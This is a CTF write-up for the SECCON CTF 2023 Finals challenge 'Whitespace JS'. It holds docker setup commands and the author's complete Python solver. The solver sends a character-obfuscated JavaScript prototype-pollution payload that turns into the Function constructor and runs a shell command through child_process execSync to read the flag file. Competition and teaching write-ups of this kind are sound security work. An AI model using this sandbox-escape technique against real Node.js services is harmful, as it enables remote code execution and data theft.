---
title: "Whitespace JS - SECCON CTF 2023 Finals"
category: "misc"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "prototype-pollution", "whitespace", "misc", "seccon-ctf-2023-finals"]
summary: "Don't worry, this is not an esolang challenge."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/misc/whitespace-js"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Finals"
  year: 2023
  challenge: "Whitespace JS"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/misc/whitespace-js>
- **CTF:** SECCON CTF 2023 Finals

---

# [misc] whitespace.js

## Description

Don't worry, this is not an esolang challenge.

- Challenge: `https://whitespace-js.{int,dom}.seccon.games:3000`

## Attachments

- [whitespace-js](files/whitespace-js)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e WEB_BASE_URL=http://localhost:3000 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/misc/whitespace-js/solver/exploit.py>

```python
import httpx
import os

BASE_URL = os.environ["WEB_BASE_URL"]


def make_str(xs: str) -> str:
    ys = []
    for x in xs:
        if x == "(":
            ys.append(f'[][{make_str("toString")}][{make_str("toString")}]``[9+8]')
        elif x == ")":
            ys.append(f'[][{make_str("toString")}][{make_str("toString")}]``[9+9]')
        else:
            ys.append(f'"{x}"[1]')
    return "+".join(ys)


command = "cat /flag-*.txt"

func_body = f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"

lines = [
    # [ ].__proto__.source = "**"
    f'[][{make_str("__proto__")}][{make_str("source")}] = {make_str("**")}',

    # [ ].__proto__.flags = func_body
    f'[][{make_str("__proto__")}][{make_str("flags")}] = {make_str(func_body)}',

    # [ ].__proto__.toString = / /.toString
    f'[][{make_str("__proto__")}][{make_str("toString")}] = //[{make_str("toString")}]',

    # -> [].toString() === `/**/${func_body}`


    # Function` `` `
    f'[][{make_str("constructor")}][{make_str("constructor")}]````',
]
expr = ";".join(lines)

res = httpx.post(
    BASE_URL,
    json={
        "expr": expr,
    },
)
print(res.text)
```
